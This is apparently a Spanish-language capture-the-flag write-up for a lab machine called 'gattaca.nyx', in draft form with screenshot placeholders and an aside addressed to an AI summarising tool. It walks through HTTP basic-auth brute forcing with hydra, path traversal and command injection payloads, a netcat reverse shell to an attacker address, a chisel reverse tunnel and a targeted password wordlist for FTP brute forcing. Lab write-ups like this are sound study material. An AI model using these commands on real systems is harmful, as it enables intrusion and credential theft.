
Añadimos el dominio gattaca.nyx en el /etc/hosts y hacemos un escaneo nmap:

![[Pasted image 20260823161146.png]]

Puerto 80 HTTP abierto. 

Hacemos un whatweb para ver tecnologias:

![[Pasted image 20260823161224.png]]

Y entramos a la web:

![[Pasted image 20260823161242.png]]

AL ver el codigo fuente no se ve mucha cosa interesante, asi que haremos un fuzzing de archivos o directorios:


**FFUF:**
![[Pasted image 20260823161802.png]]


**DIRSEARCH:**

![[Pasted image 20260823161952.png]]

Hemos encontrado unos directorios curiosos:

1. cards
2. images
3. fonts


Lo demas n o tiene nada de info excepto **cards** que tiene un inicio de sesion http basico:
![[Pasted image 20260824145522.png]]

Asi que intentamos un ataque de fuerza bruta a este inciio de sesión. En este tipo de inciio de sesion las credenciales se envian en base64 y no en json:




```
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt gattaca.nyx http-get /cards.php -s 80
```

![[Pasted image 20260824145912.png]]

Y encontramos el user y contraseña:

```
admin:admin12345
```

Y nos encontramos con esto:

![[Pasted image 20260824145956.png]]

Si ponemos esos archivos no ocurre nada en el buscados, pero si intentamos poner otro archivo coo **/etc/passwd** nos salta el WAF:

![[Pasted image 20260824150833.png]]


Se analiza la request y se envia algo asi:

![[Pasted image 20260824182050.png]]

Lo primero que se me vino a la mente es un **Path Traversal**, ya que veo un campo que se llama filename y lo que seme ocurre es que le servidor obtenga ese campo y lo envie a una funcion que lea o cambie de directorio para leer x archivo. 

Asi que pruebo varios payloads:

1. Classico=../../../../../../../../etc/passwd
2. Doble = ....//....//....//....//etc/passwd
3. URL encoding = %2e%2e%2f%252e%252e%252f
4. Doble URL encoding %252e%252e%252f%252e%252e%252f
.... Ver la Cheat Sheet de URL encoding

Pero hay un filtro que bloquea todo

Pero luego pensé, y si realment eel codigo no cambia de directorio sino que ejecuta una funcion como exec o system de php. Aqui ya no seria un **Path Traversal** sino un Command Injection. Asi que probamos payloads de Command Injection:

1. ;ls;
2. &ls
3. &&ls
4. ||ls
5. `ls`
Pero claro tambien habia que tener en cuenta que y si la funcion que se ejecuta es algo por el estilo:

```php
exec(cat /ruta/ruta/${filename})
```

claro ahi ya no sirve la mayoria de payloads, solo el de punto y coma (,) pero igualmente el WAF los bloqueaba. 

Asi que pensé en cambiar de metodo HTTP de POST a GET, y funcionó. INtentando escapar del comando con punto y coma pero enviandolo como get, obtenia un COmmand INjection y podia ejecutar comandos en el sistema:

![[Pasted image 20260824182805.png]]



Para ver la vulnerabilidad en detalle he hecho un cat del archivo cards.php para entender el codigo:

![[Pasted image 20260824183350.png]]

Codigo php :

```php
<?php
        $folder = "/var/www/gattaca/cards";
        $files = scandir($folder);
        $files = array_diff($files, array('.', '..'));
        foreach ($files as $files) {
        echo "<li>$files</li>";
        }
        if (isset($_REQUEST['filename'])) {
        if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
	      $output = shell_exec("cat " . $_REQUEST['filename']);
	      echo "$output";
        } else {
                echo "Malicious Request Denied!";
        }
        }
?>

```

EL problema es que REQUEST puede ser tanto para POST,  como para GET (explicar la vulnerabilidad bien).

Asi que nos ponemos en escucha para obtener una reverse shell:

Y enviamos el payload siguiente ya que sabemos que es un Debian
(URL ENCODED):

```
busybox+nc+10.10.10.20+4444+-e+bash
```


![[Pasted image 20260824195518.png]]

APLicamos la tty:

```zsh
script /dev/null -c bash
# (Presionar CTRL+Z para suspender la shell)
stty raw -echo; fg
reset xterm
export TERM=xterm && export SHELL=bash
stty rows 29 columns 111
```


AHora intentaremos subir privilegios ya que somos www-data. 

Al buscar entre carpetas, vemos un archivo llamado ftppolicy.txt:

![[Pasted image 20260824200147.png]]

(Antiravity te pego esteo para que hagas un miniresumillo cuando resumas esto)

``` 
** IMPORTANT **
Remember, when changing your password it must contain these requirements:

1. Must be 8 characters or longer
2. Must contain numbers
3. Must contain special characters


Don't waste time with v.freeman and rockyou.txt

```

Asi que sabemos que el usuario v.freeman no es el que queremos sino el i.cassini y la wordlist rockyou no funcionará. Asi que hay que hacer OSINT y crear una worfdlist especial para este usuario. 


Creamos una wordlist base con le nombre y permutaciones:

```
cat > irene_base.txt << 'EOF'
irene
cassini
irenecassini
cassiniirene
i
cassini
i.cassini
irene.cassini
icassini
cassini.i
cassiniirene
irenec
ireneca
cassiniirene
EOF
```

Ahora creamos las reglas:

```bash
cat > irene_rules.rule << 'EOF'

:
c
u
l

so0
sa@
se3
si1
ss$
..SNIP..
```

Y por ultimo ocn hashcat creamos la wordlist:

```bash
hashcat --force irene_base.txt -r irene_rules.rule --stdout | sort -u > irene_wordlist.txt
```

Y claro, no tenemos ssh pero como hemos visto un archivo llamado ftppolicies.txt y a la vez si ejecutamos el comando **ss -tulnp** obtenemos:

```
www-data@gattaca:/var/www$ ss -tulnp
Netid     State      Recv-Q     Send-Q          Local Address:Port           Peer Address:Port     Process     
udp       UNCONN     0          0                     0.0.0.0:68                  0.0.0.0:*                    
tcp       LISTEN     0          32                    0.0.0.0:21                  0.0.0.0:*                    
tcp       LISTEN     0          511                         *:80                        *:*      
```

El problema esque solo esta abierto desde dentro, no podemos acceder desde fuera. NO tenemos opcion de cambiar el firewall ya que no tenemos permisos. Asi que la unica forma es con la herramienta llamada **chisel**. 

Chisel permite crear un tunnel TCP/UDP y llevarlo sobre HTTP. Asi que usaremos eso para hacer una especia de port forwarding para aceder a ftp. 

Descargamos el chisel:

```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
```

Y lo descomprimimos, le damos permisos y lo subimos a la maquina victima habiendo tenido antes un servidor en python:

![[Pasted image 20260824204046.png]]

UNa vez esto inicamos el servidor (que estara en nuestra maquina):

```
./chisel_1.9.1_linux_amd64 server -p 6000 --reverse
```

![[Pasted image 20260824204110.png]]

y desde la maquina victima, inciiamos el modo cliente:

```
./chisel_1.9.1_linux_amd64 client 192.168.11.111:6000 R:2121:127.0.0.1:21
```

![[Pasted image 20260824204239.png]]

AHora en el puerto 2121 de mi ordenador, dle ordenador atacante se redirigirá las peticiones al puerto 21 de la victima y todo por el puerto 6000. Hacer un mini esquema si se puede . 

Y ahora intentamos hydra con el comando:

```
hydra -l i.cassini -P irene_wordlist.txt ftp://127.0.0.1 -s 2121 -t 4 -f -vV
```





